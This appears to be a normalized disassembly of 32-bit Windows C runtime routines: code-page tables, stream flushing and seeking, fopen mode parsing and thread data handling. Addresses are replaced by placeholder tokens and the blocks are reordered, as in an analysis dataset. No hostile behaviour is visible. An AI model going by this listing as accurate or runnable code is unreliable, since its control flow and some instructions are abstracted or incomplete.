pop ecx
cmp esi 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_423571
cmp esi 0x8
jne r-xdata
mov ecx edx
imul ecx ecx 0xc
mov eax [ edi + 0x5c ]
and [ ecx + eax + 0x8 ] 0x0
inc edx
mov [ ebp - 0x2c ] edx
mov ecx [ r--data ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ edi + 0x64 ] eax
cmp esi 0x4
jne r-xdata
mov eax [ r--data ]
add eax ecx
cmp edx eax
jge r-xdata
sub_4235ab
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ r--data ]
push esi
mov esi [ ebp + 0x8 ]
imul edx edx 0xc
add edx [ ebp + 0xc ]
cmp ecx edx
jae r-xdata
mov eax edx
imul eax eax 0xc
add eax [ ebp + 0xc ]
add ecx 0xc
cmp ecx eax
jb r-xdata
xor eax eax
cmp [ ecx + 0x4 ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
mov eax ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_423605
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x3a4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0xd
je r-xdata
mov eax [ r--data ]
pop ebp
retn
dec eax
je r-xdata
mov eax [ r--data ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_42363f
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_4199d2
mov eax [ ebp + 0x8 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] 0x1
mov eax [ eax + 0x4 ]
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4236ab
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x101
xor edi edi
lea esi [ ebx + 0x18 ]
push edi
push esi
call sub_41cae0
xor eax eax
movzx ecx ax
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x21c ] edi
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi rw-data
add esp 0xc
sub edi ebx
mov ecx 0x101
mov al [ edi + esi ]
mov [ esi ] al
inc esi
dec ecx
jne r-xdata
lea ecx [ ebx + 0x119 ]
mov edx 0x100
mov al [ ecx + edi ]
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_423714
push ebp
mov ebp esp
sub esp 0x520
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
xor ebx ebx
mov edi 0x100
test eax eax
je r-xdata
push 0xffffff9f
lea edx [ esi + 0x119 ]
pop eax
sub eax edx
mov ecx ebx
mov [ ebp - 0x520 ] eax
mov eax ebx
cmp [ ebp - 0x51c ] 0x19
ja r-xdata
or [ esi + ecx + 0x19 ] 0x10
lea eax [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
lea ecx [ ebp - 0x512 ]
jmp r-xdata
mov [ edx ] bl
or [ esi + ecx + 0x19 ] 0x20
lea eax [ ecx - 0x20 ]
mov [ edx ] al
jmp r-xdata
test al al
jne r-xdata
add edx ecx
add eax edx
mov [ ebp - 0x51c ] eax
add eax 0x20
cmp eax 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
mov eax [ ebp - 0x520 ]
inc ecx
lea edx [ esi + 0x119 ]
cmp ecx edi
jb r-xdata
movzx edx [ ecx + 0x1 ]
movzx eax al
jmp r-xdata
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x504 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push ebx
call sub_4269ec
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0x21c ]
push ebx
call sub_41b843
add esp 0x40
lea eax [ ebp - 0x304 ]
push ebx
push [ esi + 0x4 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0x21c ]
push ebx
call sub_41b843
add esp 0x24
mov ecx ebx
cmp eax edx
jbe r-xdata
test al 0x2
je r-xdata
or [ esi + ecx + 0x19 ] 0x10
mov al [ ebp + ecx - 0x204 ]
jmp r-xdata
cmp eax edi
jae r-xdata
add ecx 0x2
mov al [ ecx ]
mov [ esi + ecx + 0x119 ] bl
or [ esi + ecx + 0x19 ] 0x20
mov al [ ebp + ecx - 0x304 ]
mov [ esi + ecx + 0x119 ] al
jmp r-xdata
mov [ ebp + eax - 0x104 ] 0x20
inc eax
movzx eax [ ebp + ecx * 2 - 0x504 ]
test al 0x1
je r-xdata
jmp r-xdata
inc ecx
cmp ecx edi
jb r-xdata
sub_4238a2
push 0xc
push r--data
call sub_41ecb0
call sub_4246d6
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x70 ] ecx
je r-xdata
push 0xd
call sub_41ad36
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42393e
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_41ecf5
retn
push 0x20
call sub_4186ea
cmp esi rw-data
je r-xdata
push esi
call sub_417912
pop ecx
sub_423947
push 0x10
push r--data
call sub_41ecb0
or edi 0xffffffff
call sub_4246d6
mov ebx eax
mov [ ebp - 0x1c ] ebx
call sub_4238a2
mov esi [ ebx + 0x68 ]
push [ ebp + 0x8 ]
call sub_42363f
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax [ esi + 0x4 ]
je r-xdata
xor edi edi
push 0x220
call sub_41b8d1
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
call sub_41ecf5
retn
mov ecx 0x88
mov eax [ ebp - 0x1c ]
mov esi [ eax + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
xor esi esi
mov [ ebx ] esi
push ebx
push [ ebp + 0x8 ]
call sub_423af5
pop ecx
pop ecx
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebp - 0x1c ]
push [ eax + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
mov eax [ ebp - 0x1c ]
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ eax + 0x68 ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov eax [ ebp - 0x1c ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov ecx [ eax + 0x68 ]
cmp ecx rw-data
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_417912
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push ecx
call sub_417912
pop ecx
mov eax [ ebp - 0x1c ]
push 0xd
call sub_41ad36
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x21c ]
mov [ rw-data ] eax
mov ecx esi
mov ecx esi
mov ax [ ebx + ecx * 2 + 0xc ]
mov [ ecx * 2 + rw-data ] ax
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi 0x100
jge r-xdata
mov al [ ecx + ebx + 0x18 ]
mov [ ecx + rw-data ] al
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov al [ esi + ebx + 0x119 ]
mov [ esi + rw-data ] al
inc esi
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_423abf
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
push eax
call sub_417912
pop ecx
sub_423af5
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
call sub_42363f
mov ebx eax
pop ecx
mov [ ebp - 0x20 ] ebx
test ebx ebx
jne r-xdata
push edi
xor edi edi
mov ecx edi
mov [ ebp - 0x1c ] ecx
mov eax edi
push esi
call sub_4236ab
pop ecx
xor eax eax
jmp r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_41cae0
mov edx [ ebp - 0x1c ]
add esp 0xc
imul edx edx 0x30
lea eax [ edx + rw-data ]
mov [ ebp - 0x1c ] eax
inc ecx
add eax 0x30
mov [ ebp - 0x1c ] ecx
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
inc edi
add eax 0x8
mov [ ebp - 0x1c ] eax
cmp edi 0x4
jb r-xdata
mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp [ eax + rw-data ] ebx
je r-xdata
cmp ebx 0xfde8
je r-xdata
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
mov ebx [ ebp - 0x20 ]
push ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
call sub_423605
add esp 0x4
mov [ esi + 0x21c ] eax
push 0x6
lea ecx [ esi + 0xc ]
lea edx [ edx + rw-data ]
pop edi
mov eax [ ebp - 0x1c ]
movzx ebx [ ecx ]
movzx eax al
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx 0xfde9
je r-xdata
mov ax [ edx ]
mov [ ecx ] ax
lea edx [ edx + 0x2 ]
lea ecx [ ecx + 0x2 ]
dec edi
jne r-xdata
push esi
call sub_423714
cmp ebx eax
jbe r-xdata
pop edi
movzx eax bx
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp ebx 0x100
jae r-xdata
add ecx 0x2
cmp [ ecx ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ edi + rw-data ]
or [ esi + ebx + 0x19 ] al
movzx eax [ ecx + 0x1 ]
inc ebx
cmp [ rw-data ] edi
je r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_41cae0
mov [ esi + 0x4 ] ebx
xor ebx ebx
inc ebx
add esp 0xc
mov [ esi + 0x21c ] edi
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push esi
call sub_4236ab
jmp r-xdata
mov [ esi + 0x8 ] edi
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
pop ecx
xor eax eax
lea eax [ esi + 0x1a ]
mov ecx 0xfe
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
push [ esi + 0x4 ]
call sub_423605
add esp 0x4
mov [ esi + 0x21c ] eax
mov [ esi + 0x8 ] ebx
jmp r-xdata
movzx ecx [ eax ]
movzx edx dl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ esi + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp ecx edx
jbe r-xdata
or [ esi + ecx + 0x19 ] 0x4
inc ecx
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
sub_423cea
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_41ccf1
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
mov [ esi ] cl
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ esi ] dl
call sub_41ccf1
push 0x22
jmp r-xdata
mov al [ ecx ]
mov [ edi + ecx ] al
inc ecx
test al al
je r-xdata
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_41f411
mov eax esi
sub_423d3f
push ebp
mov ebp esp
inc [ rw-data ]
push esi
mov esi 0x1000
push esi
call sub_41b8d1
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] esi
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop esi
pop ebp
retn
sub_423d85
push 0x10
push r--data
call sub_41ecb0
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_41ad36
pop ecx
and [ ebp - 0x4 ] edi
push 0x3
pop esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_423e19
mov eax edi
call sub_41ecf5
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_4184ba
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_417912
pop ecx
mov eax [ rw-data ]
and [ eax + esi * 4 ] 0x0
inc edi
mov [ ebp - 0x1c ] edi
sub_423e22
push 0x10
push r--data
call sub_41ecb0
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
push esi
call sub_419288
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_423e96
pop ecx
mov edi eax
mov [ ebp - 0x20 ] edi
mov ebx edx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_423e8e
mov eax edi
mov edx ebx
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_41ecf5
retn
sub_423e96
push ebp
mov ebp esp
mov eax 0x1024
call sub_421de0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push ebx
call sub_42094c
xor edi edi
mov esi eax
pop ecx
mov [ ebp - 0x1018 ] esi
cmp [ ebx + 0x4 ] edi
jge r-xdata
push 0x1
push edi
push edi
push esi
call sub_421c67
add esp 0x10
mov [ ebp - 0x1010 ] eax
mov [ ebp - 0x100c ] edx
cmp edx edi
jg r-xdata
mov [ ebx + 0x4 ] edi
mov eax esi
sar eax 0x5
mov ecx esi
mov esi [ eax * 4 + rw-data ]
and ecx 0x1f
shl ecx 0x6
mov [ ebp - 0x1014 ] eax
mov al [ esi + ecx + 0x24 ]
add al al
sar al 0x1
test [ ebx + 0xc ] 0x108
mov [ ebp - 0x1005 ] al
mov eax [ ebp - 0x1010 ]
mov [ ebp - 0x1020 ] ecx
jne r-xdata
jl r-xdata
mov edi [ ebx ]
mov esi edi
sub esi [ ebx + 0x8 ]
test [ ebx + 0xc ] 0x3
je r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ ebp - 0x1010 ]
mov edi [ ebp - 0x100c ]
cdq
sub ecx eax
sbb edi edx
mov eax ecx
mov edx edi
jmp r-xdata
or eax 0xffffffff
or edx eax
jmp r-xdata
cmp eax edi
jae r-xdata
test [ ebx + 0xc ] 0x80
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
mov ecx eax
or ecx edx
jne r-xdata
call sub_41ccf1
mov [ eax ] 0x16
jmp r-xdata
mov edx [ ebp - 0x1014 ]
mov eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x100c ]
test [ eax + ecx + 0x4 ] 0x80
mov eax [ ebp - 0x1010 ]
je r-xdata
mov eax [ ebp - 0x1014 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1010 ]
cmp [ edx + ecx + 0x30 ] 0x0
mov edx [ ebp - 0x100c ]
je r-xdata
test [ ebx + 0xc ] 0x1
je r-xdata
mov eax esi
xor edx edx
jmp r-xdata
mov ecx [ ebx + 0x8 ]
jmp r-xdata
shr esi 0x1
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp ecx edi
jb r-xdata
mov edx [ ebp - 0x1014 ]
mov ebx [ ebp - 0x1018 ]
mov eax [ edx * 4 + rw-data ]
push 0x0
push [ eax + ecx + 0x2c ]
push [ eax + ecx + 0x28 ]
push ebx
call sub_421c67
mov edi eax
mov eax [ ebp - 0x1014 ]
add esp 0x10
mov ecx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1020 ]
mov [ ebp - 0x1024 ] edi
mov [ ebp - 0x101c ] edx
cmp edi [ ecx + eax + 0x28 ]
jne r-xdata
xor edx edx
add eax esi
adc edx [ ebp - 0x100c ]
shr esi 0x1
mov edx [ ebp - 0x1014 ]
sub edi [ ebx + 0x8 ]
mov eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x1020 ]
add edi [ ebx + 0x4 ]
test [ eax + ecx + 0x4 ] 0x80
mov eax [ ebp - 0x1010 ]
mov edx [ ebp - 0x100c ]
je r-xdata
xor esi esi
jmp r-xdata
cmp [ ecx ] 0xa
jne r-xdata
cmp edx [ ecx + eax + 0x2c ]
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp - 0x1018 ]
call sub_421c67
mov ecx [ ebp - 0x1010 ]
add esp 0x10
mov [ ebp - 0x101c ] edx
mov edx [ ebp - 0x100c ]
cmp eax ecx
jne r-xdata
inc ecx
inc esi
push 0x0
lea edx [ ebp - 0x1018 ]
push edx
push 0x1000
lea edx [ ebp - 0x1004 ]
push edx
push [ ecx + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
sub eax edi
sbb edx 0x0
mov [ ebp - 0x100c ] edx
shr edi 0x1
push 0x0
push edx
push ecx
push [ ebp - 0x1018 ]
call sub_421c67
add esp 0x10
test edx edx
jg r-xdata
cmp [ ebp - 0x101c ] edx
jne r-xdata
mov edi [ ebp - 0x100c ]
mov ecx [ ebp - 0x1010 ]
push 0x0
push edi
push ecx
push ebx
call sub_421c67
add esp 0x10
test edx edx
jg r-xdata
mov eax 0x200
cmp edi eax
ja r-xdata
jl r-xdata
mov eax [ ebx + 0x8 ]
lea ecx [ eax + edi ]
jmp r-xdata
mov eax [ ebp - 0x1018 ]
cmp esi eax
ja r-xdata
jl r-xdata
mov edi [ ebx + 0x18 ]
test [ ebx + 0xc ] 0x8
je r-xdata
test eax eax
jb r-xdata
cmp eax ecx
jb r-xdata
lea ecx [ ebp - 0x1004 ]
test esi esi
je r-xdata
test eax eax
jb r-xdata
inc edi
test [ ebx + 0xc ] 0x400
mov edi eax
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ ebx + 0xc ] 0x2000
jmp r-xdata
lea eax [ ebp - 0x1004 ]
sub ecx eax
xor edx edx
add ecx [ ebp - 0x1024 ]
adc edx [ ebp - 0x101c ]
mov eax ecx
jmp r-xdata
mov edx ecx
add edx eax
mov eax [ ebp - 0x1014 ]
mov ecx [ ebp - 0x1020 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x100c ]
test [ eax + ecx + 0x4 ] 0x4
inc eax
inc edi
mov eax [ ebp - 0x1010 ]
je r-xdata
mov al [ ecx ]
cmp al 0xd
jne r-xdata
movzx eax al
movsx eax [ eax + rw-data ]
add ecx eax
lea eax [ edx - 0x1 ]
cmp ecx eax
jae r-xdata
dec esi
cmp ecx edx
jae r-xdata
inc ecx
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov ecx eax
jmp r-xdata
sub_424241
push 0x14
push r--data
call sub_41ecb0
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_41ccf1
mov [ eax ] 0x9
jmp r-xdata
call sub_41ccf1
mov [ eax ] 0x9
call sub_41f411
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax edi
sar eax 0x5
mov [ ebp - 0x20 ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ ebx + eax + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_42a185
pop ecx
xor esi esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0x20 ]
mov eax [ eax * 4 + rw-data ]
test [ ebx + eax + 0x4 ] 0x1
je r-xdata
call sub_41ccf1
mov [ eax ] 0x9
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
push edi
call sub_42a43c
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
call sub_41ecf5
retn
mov [ ebp - 0x1c ] esi
test esi esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_424306
mov eax esi
jmp r-xdata
call sub_41ccbd
mov [ eax ] esi
sub_424327
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor edx edx
and [ ebp - 0x4 ] edx
push esi
mov esi [ ebp + 0xc ]
xor eax eax
push edi
mov edi [ rw-data ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov ebx 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
mov [ ebp + 0xc ] 0x1000
xor ebx ebx
or edi 0x1
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
test al al
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_42a9d6
add esp 0x14
test eax eax
jne r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or edi 0x2
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
jmp r-xdata
inc [ rw-data ]
mov eax [ ebp + 0x14 ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] ecx
cmp [ esi ] 0x20
je r-xdata
mov eax [ ebp + 0xc ]
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
inc esi
push 0x3
push esi
push r--data
call sub_42a9f4
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
sub eax 0xb
je r-xdata
push 0x20
add esi 0x3
pop eax
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] al
je r-xdata
inc edx
or edi 0x4000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0x6
jne r-xdata
and ebx 0xfffffffe
and edi 0xfffffffc
or ebx 0x2
or edi 0x80
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
inc edx
and edi 0xffffbfff
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] al
je r-xdata
or ebx 0x4000
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_42ab21
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_42ab21
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_42ab21
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or ebx 0x20000
jmp r-xdata
add esi 0x7
or ebx 0x10000
jmp r-xdata
sub_42459f
push 0x8
push r--data
call sub_41ecb0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_41ecf5
retn 0x4
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x2c ] 0x0
je r-xdata
push [ esi + 0x24 ]
call sub_417912
pop ecx
cmp [ esi + 0x34 ] 0x0
je r-xdata
push [ esi + 0x2c ]
call sub_417912
pop ecx
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0x34 ]
call sub_417912
pop ecx
cmp [ esi + 0x40 ] 0x0
je r-xdata
push [ esi + 0x3c ]
call sub_417912
pop ecx
cmp [ esi + 0x44 ] 0x0
je r-xdata
push [ esi + 0x40 ]
call sub_417912
pop ecx
cmp [ esi + 0x48 ] 0x0
je r-xdata
push [ esi + 0x44 ]
call sub_417912
pop ecx
cmp [ esi + 0x5c ] r--data
je r-xdata
push [ esi + 0x48 ]
call sub_417912
pop ecx
push 0xd
call sub_41ad36
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push [ esi + 0x5c ]
call sub_417912
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4246c1
push 0xc
call sub_41ad36
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4246cd
push esi
call sub_417912
pop ecx
push edi
call sub_424ada
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_417912
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_424980
pop ecx
sub_4246ee
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_41c736
mov esi eax
pop ecx
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x3bc
push 0x1
call sub_41b887
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
call sub_41c755
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
call sub_417912
pop ecx
xor esi esi
push 0x0
push esi
call sub_42475d
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_42475d
push 0x8
push r--data
call sub_41ecb0
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
push 0x43
pop eax
mov [ esi + 0xb8 ] ax
mov [ esi + 0x1be ] ax
mov [ esi + 0x68 ] rw-data
and [ esi + 0x3b8 ] 0x0
push 0xd
call sub_41ad36
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
